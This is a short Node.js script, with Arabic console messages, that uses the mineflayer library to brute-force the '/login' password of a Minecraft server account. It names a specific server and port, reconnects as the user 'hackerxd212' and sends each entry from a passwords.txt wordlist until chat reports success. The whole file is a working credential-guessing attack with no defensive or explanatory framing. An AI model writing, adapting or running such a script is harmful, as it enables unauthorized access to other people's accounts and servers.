const mineflayer = require('mineflayer');
const fs = require('fs');

const server = process.env.MC_SERVER || 'DreamskySr.aternos.me';
const port = parseInt(process.env.MC_PORT) || 13978;
const username = 'hackerxd212';

const passwords = fs.readFileSync('passwords.txt', 'utf-8').split('\n');
let attempt = 0;

function tryLogin() {
  if (attempt >= passwords.length) {
    console.log('❌ انتهت المحاولات. لم يتم العثور على كلمة المرور.');
    return;
  }

  const bot = mineflayer.createBot({
    host: server,
    port: port,
    username: username,
  });

  bot.once('spawn', () => {
    console.log(`🔐 تجربة كلمة المرور رقم ${attempt + 1}: ${passwords[attempt]}`);
    bot.chat(`/login ${passwords[attempt]}`);
  });

  bot.on('chat', (username, message) => {
    if (message.includes('تم تسجيل الدخول بنجاح') || message.includes('Login successful')) {
      console.log('✅ تم العثور على كلمة السر:', passwords[attempt]);
      bot.quit();
    } else if (message.includes('كلمة المرور خاطئة') || message.includes('Incorrect password')) {
      bot.quit();
    }
  });

  bot.on('end', () => {
    attempt++;
    setTimeout(tryLogin, 2000);
  });

  bot.on('error', (err) => {
    console.log('🚫 خطأ:', err.message);
    bot.quit();
  });
}

tryLogin();
